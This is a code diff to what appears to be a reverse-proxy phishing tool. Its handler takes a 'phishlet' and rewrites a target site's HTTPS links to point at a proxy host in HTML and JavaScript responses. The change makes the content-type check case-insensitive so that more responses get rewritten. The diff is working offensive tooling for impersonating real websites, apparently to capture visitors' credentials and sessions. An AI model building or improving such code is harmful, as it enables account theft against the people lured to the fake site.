@@ -143,7 +143,8 @@ def make_handler(phishlet, db_file):
                 headers.pop(h, None)
 
             ct = next((v for k, v in headers.items() if k.lower() == 'content-type'), '')  # R32D88-F2
-            if 'text/html' in ct or 'javascript' in ct:
+            ct_l = ct.lower()  # R32D89: 值大小写不敏感
+            if 'text/html' in ct_l or 'javascript' in ct_l:
                 text = body.decode('utf-8', errors='replace')
                 # sub_filters: 目标域→代理域(双向)
                 text = text.replace(f'https://{target_host}', f'http://{proxy_host}')
